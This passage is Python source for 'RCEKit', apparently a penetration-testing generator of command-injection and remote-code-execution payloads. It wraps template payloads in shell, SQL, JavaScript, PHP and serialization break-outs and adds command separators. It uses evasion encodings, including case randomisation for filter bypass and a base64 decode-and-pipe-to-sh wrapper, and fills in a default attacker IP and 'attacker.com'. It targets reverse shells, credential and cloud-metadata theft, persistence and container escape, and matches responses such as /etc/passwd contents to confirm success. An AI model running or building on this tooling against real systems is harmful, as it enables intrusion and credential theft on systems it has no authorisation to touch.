#!/usr/bin/env python3
import argparse
import base64
import json
import logging
import random
import re
import string
import sys
import urllib.parse
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Set, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("rcekit.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
# breaking changes to the CLI, output formats, or template schema.
__version__ = "2.9.0"

SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}


@dataclass(frozen=True)
class PayloadRecord:
    payload: str
    mode: str
    category: str
    environment: str
    context: str
    encoding: str
    sink: Optional[str]
    indicator: str
    safety: str
    expected_channel: str
    runner: Optional[str]
    tags: Tuple[str, ...] = ()
    notes: Tuple[str, ...] = ()
    blocking: bool = False
    stateful: bool = False
    destructive: bool = False
    separator_led: bool = True
    token: Optional[str] = None
    oob_host: Optional[str] = None
    match: Optional[str] = None
    expected_delay_ms: Optional[int] = None

class RCEKit:
    def __init__(
        self,
        attacker_ip: str = "192.168.1.100",
        attacker_domain: str = "attacker.com",
        template_path: Optional[Path] = None,
    ):
        self.attacker_ip = attacker_ip
        self.attacker_domain = attacker_domain
        self.template_path = template_path or Path(__file__).parent / "templates" / "payloads.json"
        self.setup_components()

    def setup_components(self):
        """Initialize all payload components"""
        # Injection contexts. Each context has a break-out `prefix`/`suffix` and,
        # crucially, an `escape` rule describing how the payload must be encoded to
        # remain valid *inside* the surrounding container. Two families:
        #   * language / structural break-outs (close a quote, tag, or statement)
        #   * transport / serialization contexts that carry any environment's
        #     payload and only need to survive the wire format (JSON/XML/YAML/...)
        self.contexts = {
            # Language & structural break-outs
            "raw": {"prefix": "", "suffix": "", "escape": "none"},
            "html": {"prefix": "", "suffix": "", "escape": "none"},
            "attribute": {"prefix": "\"", "suffix": "\"", "escape": "none"},
            "attribute_unquoted": {"prefix": " ", "suffix": " ", "escape": "none"},
            "javascript": {"prefix": "';", "suffix": ";//", "escape": "none"},
            "sql": {"prefix": "';", "suffix": "-- ", "escape": "none"},
            "php": {"prefix": "<?php ", "suffix": "?>", "escape": "none"},
            "unix_shell": {"prefix": "", "suffix": "", "escape": "none"},
            "windows_cmd": {"prefix": "", "suffix": "", "escape": "none"},
            "powershell": {"prefix": "", "suffix": "", "escape": "none"},
            "shell_single_quoted": {"prefix": "'; ", "suffix": " #", "escape": "none"},
            "shell_double_quoted": {"prefix": "\"; ", "suffix": " #", "escape": "none"},
            "graphql_string": {"prefix": "", "suffix": "", "escape": "graphql"},
            # Transport / serialization contexts (carry any environment's payload)
            "json": {"prefix": "", "suffix": "", "escape": "json"},
            "graphql_variable": {"prefix": "", "suffix": "", "escape": "json"},
            "xml": {"prefix": "", "suffix": "", "escape": "xml"},
            "xml_cdata": {"prefix": "<![CDATA[", "suffix": "]]>", "escape": "none"},
            "yaml": {"prefix": "\"", "suffix": "\"", "escape": "json"},
            "http_header": {"prefix": "", "suffix": "", "escape": "header"},
        }
        # Contexts that deliver any payload through a serialization layer; they are
        # compatible with every environment, not just shell runners.
        self.transport_contexts = {"json", "graphql_variable", "graphql_string", "xml", "xml_cdata", "yaml", "http_header"}
        # Original language/structural contexts used when no --contexts is given,
        # so default output size and behaviour stay stable; the richer contexts
        # above are opt-in via --contexts.
        self.default_contexts = ["raw", "html", "attribute", "javascript", "sql", "php", "unix_shell", "windows_cmd", "powershell"]
        self.separator_envs = {"unix", "windows", "docker", "kubernetes"}
        # Command chainers that break out of a concatenated shell command. Used by
        # sink-aware profiles (sink_needs_separator) to keep only payloads that can
        # actually escape a mid-command injection point. ${IFS} is deliberately not
        # here: it is a field separator, not a command separator.
        self.command_separators = ("; ", "| ", "|| ", "& ", "&& ", "&", "|",
                                   "%0a", "%0A", "%26", "%7C", "`|", "`&", "\\n", "\n")
        self.safe_detection_encodings = ["none", "url_encode", "double_url_encode"]
        # Runners whose target parser is case-insensitive, so random_case is a
        # meaningful keyword/WAF-bypass transform rather than a payload-breaking one.
        self.case_insensitive_runners = {"cmd", "powershell", "sql"}

        # Command separators and chainers for different environments
        self.separators = {
            "unix": ["; ", "| ", "|| ", "& ", "&& ", "%0a", "%0A", "${IFS}", "\\n"],
            "windows": ["&", "|", "%26", "%7C", "`|", "`&"],
            "docker": ["; ", "&& ", "| "],
            "kubernetes": ["; ", "&& "],
        }

        self.payload_categories: Dict[str, Any] = {}
        self.detection_payloads: Dict[str, List[str]] = {}
        self._load_template_payloads()

        # Encoding and obfuscation techniques.
        #
        # Every transform here must yield something an operator can actually run
        # against the target. Two classes are intentionally excluded:
        #   * Transport encodings that the channel decodes before the sink
        #     (url/double-url) and decoder-paired blobs (base64/hex variants,
        #     which carry an explicit "needs a decode-and-execute path" note).
        #   * random_case, which only survives on case-insensitive parsers and
        #     is gated per-runner in _encoding_is_compatible.
        #
        # Removed (previously emitted non-executable noise): rot13,
        # rot13_then_base64, insert_special_chars, xor_polymorphic, chunk_shuffle.
        # e.g. rot13("id") -> "vq" (runs nothing), xor/shuffle emitted literal
        # "XOR(..):"/"shuffle::" debug strings, and insert_special_chars spliced
        # raw %0a bytes into live shell commands.
        self.encoding_methods = {
            "none": lambda x: x,
            "url_encode": lambda x: urllib.parse.quote(x),
            "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            # Self-contained: carries its own decoder, so it runs as-is on a shell.
            "base64_decode_exec": lambda x: f"echo {base64.b64encode(x.encode()).decode()}|base64 -d|sh",
            # Bare blobs: only work where the *sink* base64/hex-decodes the input.
            # Opt-in, and never in the default set, so plain-text output cannot be
            # copied as a payload that silently does nothing on the target.
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "base64_then_url": lambda x: urllib.parse.quote(base64.b64encode(x.encode()).decode()),
            "double_base64": lambda x: base64.b64encode(base64.b64encode(x.encode())).decode(),
        }
        # Bare encodings that need a decoder at the sink to ever execute. They are
        # excluded from the default set and flagged loudly for text output.
        self.decoder_required_encodings = {"base64", "hex", "base64_then_url", "double_base64"}
        # Default encodings emit only payloads that run as-is on the receiving
        # channel/sink (or carry their own decoder); decoder-required blobs above
        # must be requested explicitly with --encodings.
        self.default_encodings = ["none", "url_encode", "double_url_encode", "random_case", "base64_decode_exec"]

    def _load_template_payloads(self) -> None:
        """Load payload templates from JSON/YAML files. Records the reason in
        ``self.template_error`` (``None`` on success) so callers can hard-fail
        on a missing or corrupt corpus instead of silently generating nothing."""
        self.template_error: Optional[str] = None
        if not self.template_path.exists():
            message = f"template file not found: {self.template_path}"
            logger.warning("%s", message)
            self.payload_categories = {}
            self.detection_payloads = {}
            self.template_error = message
            return

        try:
            with open(self.template_path, "r", encoding="utf-8") as template_file:
                content = template_file.read()

            if self.template_path.suffix in {".yml", ".yaml"}:
                try:
                    import yaml  # type: ignore

                    data = yaml.safe_load(content)
                except Exception as exc:  # pragma: no cover - optional dependency
                    logger.error("Failed to parse YAML template %s: %s", self.template_path, exc)
                    raise
            else:
                data = json.loads(content)

            self.payload_categories = data.get("payload_categories", {})
            self.detection_payloads = data.get("detection_payloads", {})
        except Exception as exc:
            message = f"unable to parse {self.template_path}: {exc}"
            logger.error("%s", message)
            self.payload_categories = {}
            self.detection_payloads = {}
            self.template_error = message

    def _corpus_stats(self) -> Tuple[int, int, Set[str]]:
        """Return (exploit payload count, environment count, environments)."""
        total = 0
        envs: Set[str] = set()
        for category in self.payload_categories.values():
            if not isinstance(category, dict):
                continue
            for env, payloads in category.items():
                envs.add(env)
                if isinstance(payloads, dict):
                    total += sum(len(items) for items in payloads.values())
                else:
                    total += len(payloads)
        return total, len(envs), envs

    def check_integrity(self) -> Tuple[bool, List[str]]:
        """Validate the loaded payload corpus for the ``--doctor`` health check.
        Returns ``(ok, report_lines)``."""
        report = [f"template: {self.template_path}"]
        if self.template_error:
            report.append(f"  [FAIL] {self.template_error}")
            return False, report
        report.append("  [ok] file loaded and parsed")
        total, env_count, _ = self._corpus_stats()
        detection_total = sum(len(v) for v in self.detection_payloads.values())
        report.append(f"  exploit categories: {len(self.payload_categories)}  "
                      f"payloads: {total}  environments: {env_count}")
        report.append(f"  detection environments: {len(self.detection_payloads)}  "
                      f"payloads: {detection_total}")
        ok = True
        if not self.payload_categories:
            report.append("  [warn] no exploit payload categories loaded")
        if not self.detection_payloads:
            report.append("  [warn] no detection payloads loaded")
        if not self.payload_categories and not self.detection_payloads:
            report.append("  [FAIL] corpus is empty")
            ok = False
        return ok, report

    def corpus_ready(self, mode: str) -> Tuple[bool, str]:
        """Whether the corpus can serve a run in ``mode`` ('detection' or
        'exploit'). Returns ``(ok, reason)``; used to hard-fail before a run
        would otherwise silently generate zero payloads."""
        if self.template_error:
            return False, self.template_error
        if mode == "detection":
            if not self.detection_payloads:
                return False, "no detection payloads loaded from the corpus"
        elif not self.payload_categories:
            return False, "no exploit payload categories loaded from the corpus"
        return True, ""

    def apply_watermark(self, payload: str, env: str, context_name: str, marker: str) -> str:
        """Embed a watermark comment or command into generated payloads where feasible."""
        watermark_token = f"RCEKit-ID:{marker}"

        if context_name == "attribute":
            logger.debug("Skipping watermark injection for attribute context due to quoting constraints.")
            return payload

        if env == "windows":
            return f"{payload} & REM {watermark_token}"
        if env in {"unix", "docker", "kubernetes"}:
            return f"{payload} ;# {watermark_token}"
        if env == "php":
            return f"{payload};/* {watermark_token} */"
        if env in {"python", "ruby", "perl"}:
            return f"{payload}  # {watermark_token}"
        if env == "nodejs":
            return f"{payload} // {watermark_token}"
        if env in {"java", "dotnet", "go"}:
            return f"{payload} /* {watermark_token} */"

        return f"{payload} /* {watermark_token} */"

    def _normalize_entry(self, entry: Any) -> Dict[str, Any]:
        if isinstance(entry, str):
            return {"payload": entry}
        if isinstance(entry, dict):
            return dict(entry)
        raise TypeError(f"Unsupported payload entry type: {type(entry)!r}")

    def _infer_runner(self, payload: str, env: str, sink: Optional[str]) -> Optional[str]:
        lower_payload = payload.lower()
        if "powershell" in lower_payload or "get-netipconfiguration" in lower_payload:
            return "powershell"

        runners = {
            "unix": "sh",
            "windows": "cmd",
            "nodejs": "node",
            "python": "python",
            "php": "php",
            "java": "java",
            "dotnet": "dotnet",
            "ruby": "ruby",
            "perl": "perl",
            "go": "go",
            "docker": "sh",
            "kubernetes": "kubectl",
            "sql": "sql",
            "graphql": "graphql",
            "mongodb": "mongo",
            "powershell": "powershell",
        }
        if sink and "ssti" in sink:
            return f"{env}_template"
        return runners.get(env)

    def _infer_expected_channel(self, payload: str, category_name: str, mode: str) -> str:
        lower_payload = payload.lower()
        if mode == "detection" and any(token in lower_payload for token in ["sleep", "timeout", "start-sleep"]):
            return "timing"
        if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "resolve-dnsname", "tcpclient"]):
            return "network"
        if any(token in lower_payload for token in ["console.error", "system.err", "error_log"]):
            return "stderr"
        if category_name in {"reverse_shells", "download_execute", "lateral_movement"}:
            return "network"
        return "response"

    def _infer_indicator(self, payload: str, category_name: str, env: str, mode: str) -> str:
        lower_payload = payload.lower()
        if mode == "detection":
            if any(token in lower_payload for token in ["{canary}", "detection_", "health_", "det:"]):
                return "Look for the generated canary token in the response body, stdout, stderr, or application logs."
            if any(token in lower_payload for token in ["sleep", "timeout", "start-sleep"]):
                return "Look for a reproducible response delay compared with baseline requests."
            if any(token in lower_payload for token in ["kubectl", "curl ", "wget ", "invoke-webrequest", "resolve-dnsname"]):
                return "Look for an authorized network, control-plane, or audit observable in your monitoring sink."
            return "Look for a benign execution marker in the response, logs, or telemetry pipeline."

        category_indicators = {
            "basic_enum": "Expect identity, host, process, or OS inventory data in the response or logs.",
            "file_operations": "Expect file content, directory listings, or permission errors that prove filesystem reachability.",
            "network_operations": "Expect network configuration data or an authorized outbound lookup in your monitoring sink.",
            "code_execution": "Expect proof that the runtime evaluated the snippet, such as command output or a rendered value.",
            "download_execute": "Expect an authorized outbound retrieval event or related telemetry in your monitoring sink.",
            "reverse_shells": "Expect an authorized out-of-band callback or connection attempt in your monitoring sink.",
            "credential_access": "Expect secret material, access-denied responses, or credential-store access telemetry.",
            "privilege_escalation": "Expect privilege inventory, group membership, capability listings, or access-denied signals.",
            "persistence": "Expect a durable artifact or configuration mutation only on an isolated lab target.",
            "cloud_metadata": "Expect metadata documents, cloud identity details, or blocked-access telemetry.",
            "database_enumeration": "Expect schema names, database inventory, or permission errors that confirm DB reachability.",
            "lateral_movement": "Expect an authorized remote-management event, connection attempt, or access-denied telemetry.",
            "container_escape": "Expect evidence of host boundary visibility, namespace access, or orchestrator privilege exposure.",
            "oob": "Expect an out-of-band DNS/HTTP callback to your collaborator/interactsh listener carrying the payload's unique token.",
            "waf_bypass": "Expect the same command output as the plain variant, proving the quote/space-free form slipped past input filtering.",
            "nosql_injection": "Expect authentication bypass, altered result sets, a reproducible delay from server-side JS, or a NoSQL/BSON error confirming operator injection.",
            "graphql_injection": "Expect introspection schema data, downstream command/SQL/NoSQL output reached through a resolver argument, or a GraphQL error revealing the injected value.",
        }
        return category_indicators.get(category_name, f"Expect a controlled {env} execution observable in the response or logs.")

    # Machine-readable success signatures: a regex that, if found in the target's
    # response, confirms the payload executed. Each entry maps command markers in
    # the payload to the regex that proves that command ran.
    _COMMAND_SIGNATURES = [
        (("/etc/passwd", "/etc/shadow", "awk -f:"), r"root:.*?:0:0:"),
        (("uname",), r"(Linux|Darwin|GNU|BSD)\b"),
        (("systeminfo", "cmd /c ver", " ver\n", "wmic os"), r"Microsoft Windows"),
        (("ipconfig",), r"(IPv4|Windows IP Configuration)"),
        (("ifconfig", "ip addr", "ip a\b", "ip -a"), r"(inet\s|ether\s|link/ether)"),
        (("sudo -l",), r"(may run|NOPASSWD|not allowed to run sudo)"),
        (("/etc/os-release", "lsb_release"), r"(PRETTY_NAME=|VERSION=|Distributor ID)"),
        (("printenv", "\benv\b", "set \n"), r"\bPATH="),
        (("7*7", "7 * 7"), r"(^|\D)49(\D|$)"),
        (("whoami /priv", "whoami /groups"), r"(Privilege|GROUP|SID)"),
        (("/proc/1/cgroup", "/proc/self/cgroup", "/proc/1/environ"), r"(cpuset|docker|kubepods|/init|HOSTNAME=)"),
        (("169.254.169.254", "computemetadata", "security-credentials", "latest/meta-data", "100.100.100.200"),
         r"(ami-|AccessKeyId|InstanceProfileArn|SecurityCredentials|\"Token\"|iam)"),
        (("__schema", "__typename", "__type("), r"(__schema|queryType|__typename|\"data\"\s*:)"),
        (("netstat", "ss -t", "ss -tunlp"), r"(LISTEN|ESTABLISHED|Proto)"),
    ]

    def _infer_command_match(self, payload: str, category_name: str) -> Optional[str]:
        """Return a response regex that confirms this payload executed, if known."""
        lower = payload.lower()
        for markers, regex in self._COMMAND_SIGNATURES:
            for marker in markers:
                token = marker.strip("\\b")
                if token and token.lower() in lower:
                    return regex
        # `id` / `id -u` produce a very recognisable uid=... line.
        if re.search(r"(^|[^\w.])id(\b|['\")])", payload) or "id -u" in lower:
            return r"uid=\d+"
        return None

    def _is_blocking(self, payload: str) -> bool:
        lower_payload = payload.lower()
        if any(token in lower_payload for token in
               ["tail -f", "start-sleep", "timeout /t", "readline()", "while(($i =", "select(undef"]):
            return True
        # Sleep family across languages: "sleep 5" (shell), time.sleep()/Thread.sleep()/
        # time.Sleep() (dot form), pg_sleep(), or a bare sleep( call. The old check only
        # matched "sleep " (with a space), so time.sleep(2) etc. were misclassified.
        if re.search(r"\bsleep\s", lower_payload):
            return True
        if re.search(r"(^|[^a-z0-9_])(pg_)?sleep\(", lower_payload) or ".sleep(" in lower_payload:
            return True
        return False

    def _expected_delay_ms(self, payload: str, environment: str) -> Optional[int]:
        """Best-effort parse of a blocking payload's intended delay, in
        milliseconds. The runtime disambiguates the seconds-vs-milliseconds
        sleep APIs (``time.sleep(2)`` is 2s in Python but ``Thread.sleep(2000)``
        is 2000ms in Java). Returns ``None`` when no delay can be determined, so
        the verifier falls back to its conservative fixed floor."""
        low = payload.lower()

        def sec(value: str) -> int:
            return int(round(float(value) * 1000))

        # Explicit, unambiguous units first.
        match = re.search(r"-milliseconds\s+([\d.]+)", low)
        if match:
            return int(round(float(match.group(1))))
        match = re.search(r"-seconds\s+([\d.]+)", low)
        if match:
            return sec(match.group(1))
        match = re.search(r"timeout\s+/t\s+([\d.]+)", low)
        if match:
            return sec(match.group(1))
        # Go: time.Sleep(N * time.Second|Millisecond).
        match = re.search(r"time\.sleep\(\s*([\d.]+)\s*\*\s*time\.(second|millisecond)", low)
        if match:
            return sec(match.group(1)) if match.group(2) == "second" else int(round(float(match.group(1))))
        # Perl: select(undef, undef, undef, N) -> seconds.
        match = re.search(r"select\(\s*undef\s*,\s*undef\s*,\s*undef\s*,\s*([\d.]+)", low)
        if match:
            return sec(match.group(1))
        # Java / .NET Thread.Sleep(N) -> milliseconds.
        if "thread.sleep(" in low:
            match = re.search(r"thread\.sleep\(\s*([\d.]+)", low)
            if match:
                return int(round(float(match.group(1))))
        # Node: setTimeout(cb, N) -> milliseconds.
        match = re.search(r"settimeout\([^,]*,\s*([\d.]+)\s*\)", low)
        if match:
            return int(round(float(match.group(1))))
        # SQL sleep helpers -> seconds.
        if environment in {"sql"}:
            match = re.search(r"(?:pg_sleep|sleep)\(\s*([\d.]+)", low)
            if match:
                return sec(match.group(1))
        # Python / Ruby sleep(N)/time.sleep(N) -> seconds.
        if environment in {"python", "ruby"}:
            match = re.search(r"sleep\(\s*([\d.]+)", low)
            if match:
                return sec(match.group(1))
        # Shell `sleep N` (seconds); also the generic fallback.
        match = re.search(r"\bsleep\s+([\d.]+)", low)
        if match:
            return sec(match.group(1))
        return None

    def _is_stateful(self, payload: str) -> bool:
        lower_payload = payload.lower()
        return any(
            token in lower_payload
            for token in [
                "crontab",
                "reg add",
                "schtasks",
                "new-itemproperty",
                "set-mppreference",
                "copy ",
                "chmod +x",
                "out-file",
                "kubectl run",
                "docker run",
                "tar -cf",
                ">>",
            ]
        )

    def _is_destructive(self, payload: str, category_name: str) -> bool:
        """Payloads that alter or damage the target (a stronger signal than
        `stateful`): persistence, backdoors, security-control tampering, and
        irreversible file/disk operations. Used to hold these back from live
        verification unless the operator explicitly opts in."""
        if category_name == "persistence" or self._is_stateful(payload):
            return True
        lower = payload.lower()
        return any(token in lower for token in [
            "rm -rf", "rm -f ", "mkfs", "dd if=", "del /f", "rmdir /s",
            "disablerealtimemonitoring", ":(){", "> /etc/", "shutdown", "reboot",
        ])

    def _classify_safety(self, payload: str, category_name: str, mode: str) -> str:
        lower_payload = payload.lower()
        if self._is_stateful(payload) or category_name == "persistence":
            return "stateful"
        if self._is_blocking(payload):
            return "intrusive"
        if any(token in lower_payload for token in ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "ssh ", "scp ", "winrs ", "psexec", "kubectl ", "docker run", "nsenter", "tcpclient", "fsockopen"]):
            return "intrusive"
        if "{oob}" in payload or "jndi:" in lower_payload:
            return "intrusive"
        if mode == "detection":
            return "safe"
        if category_name in {"reverse_shells", "download_execute", "credential_access", "container_escape", "lateral_movement", "oob"}:
            return "intrusive"
        return "safe"

    def _lint_payload(self, payload: str, env: str) -> List[str]:
        lower_payload = payload.lower()
        notes: List[str] = []
        if env == "windows" and payload.strip() == "Get-NetIPConfiguration":
            notes.append("Requires a PowerShell execution surface rather than plain cmd.exe.")
        if env == "python" and "subprocess.call([" in payload and "shell=True" in payload:
            notes.append("Uses shell=True with a list argument; validate runtime semantics before relying on this variant.")
        if env == "java" and "command('bash'" in payload:
            notes.append("Contains Java-style code with single-quoted strings; validate syntax before operational use.")
        if env == "go" and "exec.command('" in lower_payload:
            notes.append("Contains Go-style code with single-quoted strings; validate syntax before operational use.")
        if "process.mainmodule" in lower_payload:
            notes.append("Relies on legacy Node.js process.mainModule behavior that may be absent in newer runtimes.")
        if "nc -e " in lower_payload:
            notes.append("Requires a netcat build that supports -e; many modern distributions disable this flag.")
        return notes

    def _requires_raw_context(self, env: str) -> bool:
        return env in {"python", "php", "java", "dotnet", "ruby", "perl", "go", "nodejs", "sql", "graphql", "mongodb"}

    def _is_context_compatible(self, context_name: str, env: str, raw_context_only: bool) -> bool:
        if context_name == "raw":
            return True
        # Serialization contexts wrap any environment's payload for the wire.
        if context_name in self.transport_contexts:
            return True
        # Shell-quoted break-outs only make sense for shell runners.
        if context_name in {"shell_single_quoted", "shell_double_quoted"}:
            return env in {"unix", "docker", "kubernetes"}
        if raw_context_only:
            if env == "php":
                return context_name == "php"
            if env == "nodejs":
                return context_name == "javascript"
            return False
        if env in {"unix", "windows", "docker", "kubernetes"}:
            return context_name in {"html", "attribute", "attribute_unquoted", "sql", "unix_shell", "windows_cmd", "powershell"}
        return False

    def _passes_filters(self, safety: str, blocking: bool, max_safety: str, include_blocking: bool) -> bool:
        normalized_max = max_safety if max_safety in SAFETY_ORDER else "intrusive"
        normalized_safety = safety if safety in SAFETY_ORDER else "intrusive"
        if SAFETY_ORDER[normalized_safety] > SAFETY_ORDER[normalized_max]:
            return False
        if blocking and not include_blocking:
            return False
        return True

    def _encoding_is_compatible(self, enc_name: str, runner: Optional[str]) -> bool:
        # random_case only survives where the target parser is case-insensitive
        # (Windows cmd, PowerShell, SQL keywords). Anywhere else it corrupts the
        # command (e.g. "id" -> "iD"), so suppress it rather than emit a payload
        # that silently fails for the operator.
        if enc_name == "random_case" and runner not in self.case_insensitive_runners:
            return False
        # The base64 decode-and-run harness assumes a POSIX shell interpreter.
        if enc_name == "base64_decode_exec" and runner != "sh":
            return False
        return True

    def _escape_for_context(self, payload: str, escape: str) -> str:
        """Make a payload valid inside its surrounding container.

        A break-out payload placed verbatim inside JSON/XML/YAML/etc. would
        corrupt the wire format; these rules encode the payload so it survives
        the serialization layer and reaches the sink intact.
        """
        if escape in {"json", "yaml", "graphql"}:
            # JSON string-body escaping (also valid for YAML double-quoted
            # scalars and GraphQL string literals): handles " \\ and controls.
            return json.dumps(payload)[1:-1]
        if escape == "xml":
            return (payload.replace("&", "&amp;").replace("<", "&lt;")
                    .replace(">", "&gt;").replace('"', "&quot;").replace("'", "&apos;"))
        if escape == "url":
            return urllib.parse.quote(payload)
        if escape == "header":
            # Keep the payload on a single header line unless the operator is
            # deliberately testing CRLF/header injection.
            return payload.replace("\r", " ").replace("\n", " ")
        return payload

    def generate_payload_records(
        self,
        selected_contexts: Optional[List[str]] = None,
        selected_categories: Optional[List[str]] = None,
        selected_encodings: Optional[List[str]] = None,
        selected_environments: Optional[List[str]] = None,
        mode: str = "exploit",
        watermark_token: Optional[str] = None,
        max_safety: str = "intrusive",
        include_blocking: bool = False,
        oob_domain: Optional[str] = None,
    ) -> Iterator[PayloadRecord]:
        generated_payloads: Set[Tuple[str, str]] = set()
        contexts = selected_contexts if selected_contexts else list(self.default_contexts)
        encodings = selected_encodings if selected_encodings else (
            self.safe_detection_encodings if mode == "detection" else list(self.default_encodings)
        )

        if mode == "detection":
            environments = selected_environments if selected_environments else list(self.detection_payloads.keys())
            for context_name in contexts:
                if context_name not in self.contexts:
                    logger.warning("Unknown context: %s", context_name)
                    continue
                for env in environments:
                    for entry in self.detection_payloads.get(env, []):
                        base = self._normalize_entry(entry)
                        # {canary}/{oob} stay as placeholders here and are given a
                        # fresh per-record correlation token in _encode_record_variants.
                        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip)
                        if "{oob}" in payload and not oob_domain:
                            continue
                        runner = base.get("runner") or self._infer_runner(payload, env, None)
                        blocking = bool(base.get("blocking", self._is_blocking(payload)))
                        safety = base.get("safety") or self._classify_safety(payload, "detection", "detection")
                        raw_context_only = bool(base.get("raw_context_only", self._requires_raw_context(env)))
                        if not self._passes_filters(safety, blocking, max_safety, include_blocking):
                            continue
                        if not self._is_context_compatible(context_name, env, raw_context_only):
                            continue
                        yield from self._encode_record_variants(
                            payload=payload,
                            context_name=context_name,
                            encodings=encodings,
                            generated_payloads=generated_payloads,
                            mode="detection",
                            category="detection",
                            environment=env,
                            sink=None,
                            indicator=base.get("indicator") or self._infer_indicator(payload, "detection", env, "detection"),
                            safety=safety,
                            expected_channel=base.get("expected_channel") or self._infer_expected_channel(payload, "detection", "detection"),
                            runner=runner,
                            tags=tuple(base.get("tags", ())),
                            notes=tuple([*base.get("notes", ()), *self._lint_payload(payload, env)]),
                            blocking=blocking,
                            stateful=bool(base.get("stateful", self._is_stateful(payload))),
                            oob_domain=oob_domain,
                            match_sig=base.get("match") or self._infer_command_match(payload, "detection"),
                        )
            return

        categories = selected_categories if selected_categories else list(self.payload_categories.keys())
        environments = selected_environments if selected_environments else [
            "unix",
            "windows",
            "nodejs",
            "python",
            "php",
            "java",
            "dotnet",
            "ruby",
            "perl",
            "go",
            "docker",
            "kubernetes",
            "graphql",
            "mongodb",
        ]

        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning("Unknown context: %s", context_name)
                continue
            for category_name in categories:
                category = self.payload_categories.get(category_name)
                if category is None:
                    logger.warning("Unknown category: %s", category_name)
                    continue
                for env in environments:
                    if env not in category:
                        continue
                    env_payloads = category[env]
                    if isinstance(env_payloads, dict):
                        for sink, payloads in env_payloads.items():
                            for entry in payloads:
                                yield from self._build_record_set(
                                    entry=entry,
                                    category_name=category_name,
                                    env=env,
                                    sink=sink,
                                    context_name=context_name,
                                    encodings=encodings,
                                    generated_payloads=generated_payloads,
                                    mode=mode,
                                    watermark_token=watermark_token,
                                    max_safety=max_safety,
                                    include_blocking=include_blocking,
                                    oob_domain=oob_domain,
                                )
                    else:
                        for entry in env_payloads:
                            yield from self._build_record_set(
                                entry=entry,
                                category_name=category_name,
                                env=env,
                                sink=None,
                                context_name=context_name,
                                encodings=encodings,
                                generated_payloads=generated_payloads,
                                mode=mode,
                                watermark_token=watermark_token,
                                max_safety=max_safety,
                                include_blocking=include_blocking,
                                oob_domain=oob_domain,
                            )

    def _build_record_set(
        self,
        entry: Any,
        category_name: str,
        env: str,
        sink: Optional[str],
        context_name: str,
        encodings: List[str],
        generated_payloads: Set[Tuple[str, str]],
        mode: str,
        watermark_token: Optional[str],
        max_safety: str,
        include_blocking: bool,
        oob_domain: Optional[str] = None,
    ) -> Iterator[PayloadRecord]:
        base = self._normalize_entry(entry)
        payload = str(base["payload"]).replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)
        # OOB payloads only make sense with a collaborator domain to call back to.
        if "{oob}" in payload and not oob_domain:
            return
        runner = base.get("runner") or self._infer_runner(payload, env, sink)
        blocking = bool(base.get("blocking", self._is_blocking(payload)))
        safety = base.get("safety") or self._classify_safety(payload, category_name, mode)
        raw_context_only = bool(base.get("raw_context_only", self._requires_raw_context(env)))
        if not self._passes_filters(safety, blocking, max_safety, include_blocking):
            return
        if not self._is_context_compatible(context_name, env, raw_context_only):
            return

        notes = tuple([*base.get("notes", ()), *self._lint_payload(payload, env)])
        tags = tuple(dict.fromkeys([*base.get("tags", ()), category_name, *( [sink] if sink else [] )]))
        match_sig = base.get("match") or self._infer_command_match(payload, category_name)
        variants = [payload]
        # Shell-quoted break-out contexts already supply their own separator, so
        # prepending an env separator would produce ";;" style syntax errors.
        if env in self.separator_envs and context_name not in {"shell_single_quoted", "shell_double_quoted"}:
            variants = [f"{separator}{payload}" for separator in self.separators[env]]
            variants.append(payload)

        for variant in variants:
            final_payload = self.apply_watermark(variant, env, context_name, watermark_token) if watermark_token else variant
            yield from self._encode_record_variants(
                payload=final_payload,
                context_name=context_name,
                encodings=encodings,
                generated_payloads=generated_payloads,
                mode=mode,
                category=category_name,
                environment=env,
                sink=sink,
                indicator=base.get("indicator") or self._infer_indicator(payload, category_name, env, mode),
                safety=safety,
                expected_channel=base.get("expected_channel") or self._infer_expected_channel(payload, category_name, mode),
                runner=runner,
                tags=tags,
                notes=notes,
                blocking=blocking,
                stateful=bool(base.get("stateful", self._is_stateful(payload))),
                oob_domain=oob_domain,
                match_sig=match_sig,
            )

    def _encode_record_variants(
        self,
        payload: str,
        context_name: str,
        encodings: List[str],
        generated_payloads: Set[Tuple[str, str]],
        mode: str,
        category: str,
        environment: str,
        sink: Optional[str],
        indicator: str,
        safety: str,
        expected_channel: str,
        runner: Optional[str],
        tags: Tuple[str, ...],
        notes: Tuple[str, ...],
        blocking: bool,
        stateful: bool,
        oob_domain: Optional[str] = None,
        match_sig: Optional[str] = None,
    ) -> Iterator[PayloadRecord]:
        context = self.contexts[context_name]
        destructive = self._is_destructive(payload, category)
        expected_delay_ms = self._expected_delay_ms(payload, environment) if blocking else None
        for enc_name in encodings:
            if enc_name not in self.encoding_methods or not self._encoding_is_compatible(enc_name, runner):
                continue
            try:
                # Give each emitted variant its own correlation token so a received
                # callback or reflected canary maps back to exactly one payload.
                working = payload
                token: Optional[str] = None
                oob_host: Optional[str] = None
                math_match: Optional[str] = None
                exp_channel = expected_channel
                ind = indicator
                if "{oob}" in working and oob_domain:
                    token = self._generate_oob_token()
                    oob_host = f"{token}.{oob_domain}"
                    working = working.replace("{oob}", oob_host)
                    exp_channel = "interactsh"
                    ind = f"Look for an out-of-band DNS/HTTP callback to {oob_host} in your OOB listener."
                elif "{canary}" in working:
                    token = self._generate_canary()
                    working = working.replace("{canary}", token)
                elif "{math}" in working:
                    # Randomized arithmetic canary for template/expression sinks.
                    # A fixed 7*7=49 collides with any '49' already in the page
                    # (dates, counters, ids) and is reported inconclusive; a random
                    # 4-digit product is effectively unique, so its appearance is
                    # proof the engine evaluated the expression, not a coincidence.
                    a = random.randint(1000, 9999)
